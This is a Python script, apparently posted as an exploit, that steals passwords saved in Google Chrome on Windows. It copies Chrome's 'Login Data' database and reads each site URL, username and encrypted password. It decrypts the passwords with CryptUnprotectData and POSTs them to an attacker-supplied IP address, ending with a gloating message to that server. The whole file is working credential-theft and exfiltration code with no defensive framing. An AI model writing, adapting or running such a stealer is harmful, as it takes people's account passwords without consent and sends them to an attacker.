# Exploit Title: Extracting saved passwords from Google Chrome
# Exploit Author: Rajat Gupta


white = '\033[1;97m'
blue = "\033[0;34m"
green = '\033[1;32m'
purple = "\033[0;35m"
cyan = "\033[0;36m"
red = '\033[1;31m'
yellow = '\033[1;33m'
BBlue="\033[1;34m"
BCyan="\033[1;36m"
BIBlue = "\033[1;94m"
BICyan = "\033[1;96m"
IBlue = "\033[0;94m"
ICyan = "\033[0;96m"
end = '\033[1;m'

print("""%s
     ___      .__   __. +___________+  ______   .__   __.
    /   \     |  \ |  | |           | /  __  \  |  \ |  |
   /  ^  \    |   \|  | `---|  |----`|  |  |  | |   \|  |
  /  /_\  \   |  . `  |     |  |     |  |  |  | |  . `  |
 /  _____  \  |  |\   |     |  |     |  `--'  | |  |\   |
/__/     \__\ |__| \__|     |__|      \______/  |__| \__|
                                              %sRAJAT GUPTA%s""" % (BIBlue,ICyan,end))





import win32crypt
from os import getenv
from shutil import copyfile
import sqlite3
import requests

# LOCALAPPDATA is a win Environment variable which points to >> C:\Users\{username}\AppData\Local
path = getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data\Default\Login Data"

path2 = getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data\Default\Login2"
copyfile(path, path2)

conn = sqlite3.connect(path2)

cursor = conn.cursor()
cursor.execute('SELECT action_url, username_value, password_value from logins')

x = input("Enter the attacker ip :")
url = 'http://' + x
print(url)
for raw in cursor.fetchall():
    #print(raw[0] + '\n' + raw[1])     # action_url and username_value

    passw=win32crypt.CryptUnprotectData(raw[2])[1]
    query = {'action':raw[0], 'username':raw[1], 'password':passw}
    #print(passw)
    r = requests.post(url, data=query)
    
r = requests.post(url, data='*****One guy Screwed!!******')
conn.close()



    
